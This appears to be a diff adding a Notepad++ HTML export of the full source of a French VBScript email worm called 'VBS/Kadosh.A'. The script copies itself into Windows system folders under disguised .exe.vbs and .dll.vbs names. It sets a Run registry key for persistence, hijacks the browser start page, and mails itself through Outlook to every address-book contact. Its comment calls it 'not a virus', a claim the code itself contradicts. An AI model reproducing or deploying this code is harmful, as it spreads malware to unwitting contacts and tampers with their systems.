@@ -1,0 +1,88 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">rem VBS/Kadosh.A par PandaKiller
+rem Ce fichier se copie dans le r‚pertoire WINDOWS sous le nom de
+rem WINEXEC.EXE.VBS et dans le r‚pertoire SYSTEM sous winRun.dll.vbs
+rem Il change la page de d‚marrage du WEB et met LIVE.MULTIMANIA.COM
+rem ATTENTION : Norton d‚tŠcte ce programme comme le virus VBS.NewLove.A
+rem CE N'EST PAS UN VIRUS : IL NE DTRUIT RIEN
+</span><span class="sc0">
+</span><span class="sc7">DEBUT</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">DEBUT</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">a.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sys</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">a.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">a.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\WinExec.exe.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">sys&amp;</span><span class="sc4">"\WinRun.dll.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">INTERNET</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">EMAIL</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">msgbox</span><span class="sc0"> </span><span class="sc4">"Le tour du monde en 20 jours"</span><span class="sc6">,</span><span class="sc7">vbinformation</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc1">rem MODIFIE LA PAGE DE DEMARRAGE D'INTERNET
+</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">INTERNET</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">W</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Wscript.CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">W.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"live.multimania.com"</span><span class="sc0">
+</span><span class="sc7">W.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinExec"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"C:\WINDOWS\WinExec.exe.vbs"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc1">rem ENVOIE UNE DE SES COPIE A TOUS LES DESTINATAIRE DU CARNET D'ADRESSE
+</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EMAIL</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">K</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">L</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">K.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">M</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">L.AddressLists</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">M.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">N</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">K.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">O</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">M.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">P</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">M.AddressEntries</span><span class="sc6">(</span><span class="sc7">O</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">O</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">N.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">P.Address</span><span class="sc0">
+</span><span class="sc3">Else</span><span class="sc0">
+</span><span class="sc7">N.BCC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">N.BCC</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"; "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">P.Address</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc7">N.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Le Tour du Monde"</span><span class="sc0">
+</span><span class="sc7">N.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Voici une lettre qui va faire le tour du monde. Ouvre Vite"</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Q</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">N.Attachments.Add</span><span class="sc0"> </span><span class="sc7">Q.BuildPath</span><span class="sc6">(</span><span class="sc7">Q.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"WinExec.exe.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">N.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span></div></body>
+</html>
